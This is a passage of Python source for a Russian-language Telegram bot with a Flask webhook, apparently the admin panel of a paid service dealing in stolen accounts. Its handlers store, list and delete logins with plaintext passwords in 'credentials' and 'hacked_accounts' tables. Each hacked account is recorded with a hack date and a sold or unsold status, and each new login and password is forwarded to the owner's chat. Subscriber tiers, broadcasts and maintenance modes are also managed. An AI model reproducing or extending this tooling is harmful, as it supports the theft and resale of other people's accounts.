    logger.info(f"/viewdb от {chat_id}")
    access = check_access(chat_id, 'viewdb')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            response = "🗄 *Содержимое базы данных*\n\n"
            
            c.execute("SELECT chat_id, prefix, username, subscription_end FROM users")
            users = c.fetchall()
            response += "👥 *Пользователи*:\n"
            if not users:
                response += "📭 Пусто\n"
            for chat_id_db, prefix, username_db, sub_end in users:
                response += (
                    f"🆔 `{chat_id_db}`\n"
                    f"👤 @{username_db or 'Неизвестно'}\n"
                    f"🔑 `{prefix}`\n"
                    f"🕒 Подписка до: {sub_end or 'Неизвестно'}\n\n"
                )
            
            c.execute("SELECT login, password, added_time FROM credentials")
            credentials = c.fetchall()
            response += "🔐 *Пароли*:\n"
            if not credentials:
                response += "📭 Пусто\n"
            for login, password, added_time in credentials:
                response += (
                    f"🔑 `{login}`\n"
                    f"🔒 `{password}`\n"
                    f"🕒 Добавлено: {added_time or 'Неизвестно'}\n\n"
                )
            
            c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
            hacked = c.fetchall()
            response += "💻 *Взломанные аккаунты*:\n"
            if not hacked:
                response += "📭 Пусто\n"
            for login, password, status, hack_date in hacked:
                response += (
                    f"🔑 `{login}`\n"
                    f"🔒 `{password}`\n"
                    f"📊 `{status}`\n"
                    f"🕒 Взломан: {hack_date or 'Неизвестно'}\n\n"
                )
            
            bot.reply_to(message, response, parse_mode='Markdown')
            user = get_user(chat_id)
            if user:
                save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /viewdb: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')
    finally:
        conn.close()

# /database (переписано через кнопки)
@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/database от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = "🗄 *Управление базой данных*\nВыберите действие:"
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🔍 Просмотреть данные", callback_data="db_view"),
        types.InlineKeyboardButton("➕ Добавить данные", callback_data="db_add"),
        types.InlineKeyboardButton("🗑 Удалить данные", callback_data="db_delete")
    )
    try:
        bot.reply_to(message, response, reply_markup=keyboard, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /database: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data in ['db_view', 'db_add', 'db_delete'])
def handle_database_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    if call.data == 'db_view':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("👥 Пользователи", callback_data="db_view_users"),
            types.InlineKeyboardButton("🔐 Пароли", callback_data="db_view_credentials"),
            types.InlineKeyboardButton("💻 Взломанные аккаунты", callback_data="db_view_hacked")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔍 *Выберите таблицу для просмотра*:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        bot.answer_callback_query(call.id)
    elif call.data == 'db_add':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("💾 В hacked", callback_data="db_add_hacked"),
            types.InlineKeyboardButton("🔐 В credentials", callback_data="db_add_cred"),
            types.InlineKeyboardButton("👤 Пользователь", callback_data="db_add_user")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="➕ *Куда добавить данные?*:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        bot.answer_callback_query(call.id)
    elif call.data == 'db_delete':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🔐 Удалить пароль", callback_data="db_delete_cred"),
            types.InlineKeyboardButton("💾 Удалить hacked", callback_data="db_delete_hacked"),
            types.InlineKeyboardButton("👤 Удалить пользователя", callback_data="db_delete_user")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🗑 *Что удалить?*:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_view_'))
def handle_db_view_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Просмотр {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    try:
        with conn.cursor() as c:
            response = ""
            if call.data == 'db_view_users':
                response = "👥 *Пользователи*:\n"
                c.execute("SELECT chat_id, prefix, username, subscription_end FROM users")
                users = c.fetchall()
                if not users:
                    response += "📭 Пусто\n"
                for chat_id_db, prefix, username_db, sub_end in users:
                    response += (
                        f"🆔 `{chat_id_db}`\n"
                        f"👤 @{username_db or 'Неизвестно'}\n"
                        f"🔑 `{prefix}`\n"
                        f"🕒 Подписка до: {sub_end or 'Неизвестно'}\n\n"
                    )
            elif call.data == 'db_view_credentials':
                response = "🔐 *Пароли*:\n"
                c.execute("SELECT login, password, added_time FROM credentials")
                credentials = c.fetchall()
                if not credentials:
                    response += "📭 Пусто\n"
                for login, password, added_time in credentials:
                    response += (
                        f"🔑 `{login}`\n"
                        f"🔒 `{password}`\n"
                        f"🕒 Добавлено: {added_time or 'Неизвестно'}\n\n"
                    )
            elif call.data == 'db_view_hacked':
                response = "💻 *Взломанные аккаунты*:\n"
                c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
                hacked = c.fetchall()
                if not hacked:
                    response += "📭 Пусто\n"
                for login, password, status, hack_date in hacked:
                    response += (
                        f"🔑 `{login}`\n"
                        f"🔒 `{password}`\n"
                        f"📊 `{status}`\n"
                        f"🕒 Взломан: {hack_date or 'Неизвестно'}\n\n"
                    )
            bot.send_message(chat_id, response, parse_mode='Markdown')
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("🔙 Назад", callback_data="db_main_menu")
            )
            bot.send_message(
                chat_id,
                "⚙️ *Вернуться в меню базы?*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка просмотра: {e}")
        bot.send_message(chat_id, "❌ *Ошибка просмотра данных!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data in ['db_add_hacked', 'db_add_cred', 'db_add_user'])
def handle_db_add_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Добавление {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    if call.data == 'db_add_hacked':
        msg = bot.send_message(chat_id, "📝 *Введите логин для hacked*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_add_hacked_login)
        bot.answer_callback_query(call.id)
    elif call.data == 'db_add_cred':
        msg = bot.send_message(chat_id, "📝 *Введите логин для credentials*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_add_cred_login)
        bot.answer_callback_query(call.id)
    elif call.data == 'db_add_user':
        msg = bot.send_message(
            chat_id,
            "📝 *Введите chat_id и префикс (через пробел)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_add_user)
        bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data in ['db_delete_cred', 'db_delete_hacked', 'db_delete_user'])
def handle_db_delete_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Удаление {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    if call.data == 'db_delete_cred':
        msg = bot.send_message(chat_id, "📝 *Введите логин для удаления из credentials*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_delete_cred)
        bot.answer_callback_query(call.id)
    elif call.data == 'db_delete_hacked':
        msg = bot.send_message(chat_id, "📝 *Введите логин для удаления из hacked*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_delete_hacked)
        bot.answer_callback_query(call.id)
    elif call.data == 'db_delete_user':
        msg = bot.send_message(chat_id, "📝 *Введите chat_id для удаления пользователя*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_delete_user)
        bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'db_main_menu')
def handle_db_main_menu(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Возврат в меню от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    response = "🗄 *Управление базой данных*\nВыберите действие:"
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🔍 Просмотреть данные", callback_data="db_view"),
        types.InlineKeyboardButton("➕ Добавить данные", callback_data="db_add"),
        types.InlineKeyboardButton("🗑 Удалить данные", callback_data="db_delete")
    )
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=response,
        parse_mode='Markdown',
        reply_markup=keyboard
    )
    bot.answer_callback_query(call.id)

def process_delete_hacked(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Удаление hacked: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
            if c.rowcount == 0:
                bot.reply_to(message, "❌ *Логин не найден!*", parse_mode='Markdown')
            else:
                conn.commit()
                bot.reply_to(message, f"✅ *Аккаунт `{login}` удалён из hacked!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.reply_to(message, "❌ *Ошибка удаления!*", parse_mode='Markdown')
    finally:
        conn.close()

def process_delete_user(message):
    chat_id = str(message.chat.id)
    target_id = sanitize_input(message.text)
    logger.info(f"Удаление пользователя: {target_id} от {chat_id}")
    if not target_id or not target_id.isdigit():
        bot.reply_to(message, "❌ *chat_id должен быть числом!*", parse_mode='Markdown')
        return
    if target_id == ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ *Нельзя удалить Создателя!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute("DELETE FROM users WHERE chat_id = %s", (target_id,))
            if c.rowcount == 0:
                bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
            else:
                conn.commit()
                bot.reply_to(message, f"✅ *Пользователь `{target_id}` удалён!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.reply_to(message, "❌ *Ошибка удаления!*", parse_mode='Markdown')
    finally:
        conn.close()

def process_add_cred_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин для credentials: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_add_cred_password(m, login))

def process_add_cred_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"Пароль для {login} от {chat_id}")
    if not password:
        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO credentials (login, password, added_time, added_by)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    added_time = EXCLUDED.added_time,
                    added_by = EXCLUDED.added_by
                ''',
                (login, password, get_current_time().isoformat(), chat_id)
            )
            conn.commit()
            bot.reply_to(
                message,
                f"✅ *Пароль для `{login}` добавлен в credentials!*",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"🔐 *Добавлен пароль*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n➕ *Добавил*: {chat_id}",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Ошибка добавления: {e}")
        bot.reply_to(message, "❌ *Ошибка добавления!*", parse_mode='Markdown')
    finally:
        conn.close()

def process_add_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин для hacked: {login} от {chat_id}")
    if not login:
        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_add_hacked_password(m, login))

def process_add_hacked_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"Пароль для {login} от {chat_id}")
    if not password:
        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("✅ Продан", callback_data=f"db_hacked_status_sold_{login}_{password}"),
        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"db_hacked_status_not_sold_{login}_{password}")
    )
    bot.reply_to(
        message,
        "📊 *Выберите статус аккаунта*:",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_hacked_status_'))
def handle_db_hacked_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Статус {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "Продан" if status == "sold" else "Непродан"
        conn = get_db_connection()
        if not conn:
            bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    hack_date = EXCLUDED.hack_date,
                    prefix = EXCLUDED.prefix,
                    sold_status = EXCLUDED.sold_status,
                    linked_chat_id = EXCLUDED.linked_chat_id
                ''',
                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
            )
            conn.commit()
            bot.send_message(
                chat_id,
                f"✅ *Аккаунт `{login}` добавлен в hacked!*\n📊 *Статус*: {sold_status}",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"💾 *Аккаунт добавлен в hacked*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n📊 *Статус*: {sold_status}\n➕ *Добавил*: {chat_id}",
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка добавления: {e}")
        bot.send_message(chat_id, "❌ *Ошибка добавления!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        if conn:
            conn.close()

def process_add_user(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        target_id, prefix = sanitize_input(message.text).split(maxsplit=1)
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        target_username = get_user(target_id)['username'] if get_user(target_id) else "Неизвестно"
        save_user(target_id, prefix, subscription_end, target_id, target_username)
        bot.reply_to(
            message,
            f"✅ *Пользователь `{target_id}` добавлен!*\n🔑 *Префикс*: `{prefix}`",
            parse_mode='Markdown'
        )
        bot.send_message(
            target_id,
            f"🎉 *Вы добавлены в систему!*\n🔑 *Ваш префикс*: `{prefix}`",
            parse_mode='Markdown'
        )
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except ValueError:
        bot.reply_to(
            message,
            "❌ *Формат: chat_id префикс (например: 123456 Админ)*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка добавления: {e}")
        bot.reply_to(message, "❌ *Ошибка добавления!*", parse_mode='Markdown')

# /broadcast
@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/broadcast от {chat_id}")
    access = check_access(chat_id, 'broadcast')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📢 *Введите сообщение для рассылки всем пользователям*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_broadcast_message)

def process_broadcast_message(message):
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Рассылка от {chat_id}: {text}")
    if not text:
        bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
        return
    users = get_all_users()
    if not users:
        bot.reply_to(message, "📭 *Нет пользователей для рассылки!*", parse_mode='Markdown')
        return
    success_count = 0
    fail_count = 0
    for user_id, _, user_name in users:
        try:
            bot.send_message(
                user_id,
                f"📢 *Объявление от администрации*\n\n{text}",
                parse_mode='Markdown'
            )
            success_count += 1
            logger.info(f"Сообщение отправлено: {user_id}")
            time.sleep(0.1)  # Защита от лимитов Telegram
        except Exception as e:
            logger.error(f"Ошибка отправки {user_id}: {e}")
            fail_count += 1
    response = (
        f"✅ *Рассылка завершена!*\n"
        f"👥 *Отправлено*: {success_count} пользователям\n"
        f"❌ *Не доставлено*: {fail_count}"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), user['username'])
    except Exception as e:
        logger.error(f"Ошибка ответа: {e}")
        bot.reply_to(message, "❌ *Ошибка завершения рассылки!*", parse_mode='Markdown')

# /techstop
@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/techstop от {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите причину и длительность техперерыва в часах (через пробел, например: Обновление 2)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_techstop)

def process_techstop(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        reason, hours = sanitize_input(message.text).rsplit(maxsplit=1)
        hours = int(hours)
        if hours <= 0:
            raise ValueError("Длительность должна быть больше 0")
        tech_reason = reason
        tech_end_time = get_current_time() + timedelta(hours=hours)
        tech_mode = True
        response = (
            f"🚨 *Технический перерыв включён!*\n"
            f"📝 *Причина*: {tech_reason}\n"
            f"🕒 *Окончание*: {format_time(tech_end_time)}"
        )
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except ValueError as e:
        bot.reply_to(
            message,
            "❌ *Формат: Причина Часы (например: Обновление 2)*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка техперерыва: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /techstopoff
@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/techstopoff от {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    tech_mode = False
    tech_reason = ""
    tech_end_time = None
    response = "✅ *Технический перерыв отключён!*"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /techstopoff: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /adprefix
@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/adprefix от {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id пользователя*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_adprefix_chat_id)

def process_adprefix_chat_id(message):
    chat_id = str(message.chat.id)
    target_id = sanitize_input(message.text)
    logger.info(f"chat_id для /adprefix: {target_id}")
    if not target_id or not target_id.isdigit():
        bot.reply_to(message, "❌ *chat_id должен быть числом!*", parse_mode='Markdown')
        return
    target_user = get_user(target_id)
    if not target_user:
        bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    prefixes = ["Админ", "Подписчик", "ТехПомощник", "VIP"]
    for prefix in prefixes:
        keyboard.add(
            types.InlineKeyboardButton(
                prefix,
                callback_data=f"adprefix_{target_id}_{prefix}"
            )
        )
    bot.reply_to(
        message,
        f"🔑 *Выберите префикс для пользователя {target_id}*:",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('adprefix_'))
def handle_adprefix_select(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Обработка префикса {call.data}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.send_message(chat_id, access, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    try:
        _, target_id, prefix = call.data.split('_', 2)
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        target_user = get_user(target_id)
        target_username = target_user['username'] if target_user else "Неизвестно"
        save_user(target_id, prefix, subscription_end, target_id, target_username)
        bot.send_message(
            chat_id,
            f"✅ *Подписка выдана для `{target_id}`!*\n🔑 *Префикс*: `{prefix}`",
            parse_mode='Markdown'
        )
        bot.send_message(
            target_id,
            f"🎉 *Ваш префикс обновлён!*\n🔑 *Новый префикс*: `{prefix}`\n🕒 *Подписка до*: {format_time(datetime.fromisoformat(subscription_end))}",
            parse_mode='Markdown'
        )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка обработки префикса: {e}")
        bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)

# /delprefix
@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/delprefix от {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id и причину удаления (например: 123456 Нарушение)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_delprefix)

def process_delprefix(message):
    chat_id = str(message.chat.id)
    try:
        parts = sanitize_input(message.text).strip().split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                "❌ *Формат: chat_id причина (например: 123456 Нарушение)*",
                parse_mode='Markdown'
            )
            return
        target_id, reason = parts
        if not target_id.isdigit():
            bot.reply_to(message, "❌ *chat_id должен быть числом!*", parse_mode='Markdown')
            return
        if target_id == ADMIN_CHAT_ID:
            bot.reply_to(message, "❌ *Нельзя удалить префикс Создателя!*", parse_mode='Markdown')
            return
        target_user = get_user(target_id)
        if not target_user:
            bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
            return
        save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, target_user['username'])
        bot.reply_to(
            message,
            f"✅ *Префикс для `{target_id}` сброшен до Посетителя!*\n📝 *Причина*: {reason}",
            parse_mode='Markdown'
        )
        bot.send_message(
            target_id,
            f"⚠️ *Ваш префикс сброшен до Посетителя!*\n📝 *Причина*: {reason}",
            parse_mode='Markdown'
        )
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🗑 *Префикс сброшен*\n🆔 *Пользователь*: `{target_id}`\n📝 *Причина*: {reason}\n👤 *Действие от*: {chat_id}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка /delprefix: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /adduser
@bot.message_handler(commands=['adduser'])
def adduser_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/adduser от {chat_id}")
    access = check_access(chat_id, 'adduser')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id и префикс (через пробел, например: 123456 Админ)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_add_user)

# /messageuser
@bot.message_handler(commands=['messageuser'])
def messageuser_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/messageuser от {chat_id}")
    access = check_access(chat_id, 'messageuser')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id и сообщение (например: 123456 Привет)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_messageuser)

def process_messageuser(message):
    chat_id = str(message.chat.id)
    try:
        parts = sanitize_input(message.text).strip().split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                "❌ *Формат: chat_id сообщение (например: 123456 Привет)*",
                parse_mode='Markdown'
            )
            return
        target_id, text = parts
        if not target_id.isdigit():
            bot.reply_to(message, "❌ *chat_id должен быть числом!*", parse_mode='Markdown')
            return
        target_user = get_user(target_id)
        if not target_user:
            bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
            return
        bot.send_message(
            target_id,
            f"📩 *Сообщение от администрации*\n\n{text}",
            parse_mode='Markdown'
        )
        bot.reply_to(
            message,
            f"✅ *Сообщение отправлено пользователю `{target_id}`!*",
            parse_mode='Markdown'
        )
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /messageuser: {e}")
        bot.reply_to(message, "❌ *Ошибка отправки сообщения!*", parse_mode='Markdown')

# /addhacked
@bot.message_handler(commands=['addhacked'])
def addhacked_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/addhacked от {chat_id}")
    access = check_access(chat_id, 'addhacked')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите логин для взломанного аккаунта*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_add_hacked_login)

# /addcred
@bot.message_handler(commands=['addcred'])
def addcred_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/addcred от {chat_id}")
    access = check_access(chat_id, 'addcred')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите логин для credentials*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_add_cred_login)

# Запуск бота
if __name__ == '__main__':
    try:
        logger.info("Инициализация базы")
        if init_db():
            logger.info("База готова")
        else:
            logger.error("Ошибка базы")
            raise Exception("Не удалось инициализировать базу")
        logger.info("Запуск keep_alive")
        threading.Thread(target=keep_alive, daemon=True).start()
        logger.info("Запуск Flask")
        bot.remove_webhook()
        time.sleep(1)
        webhook_url = f"{SITE_URL}/webhook"
        bot.set_webhook(
            url=webhook_url,
            secret_token=SECRET_WEBHOOK_TOKEN,
            timeout=10
        )
        logger.info(f"Вебхук установлен: {webhook_url}")
        app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")
        raise
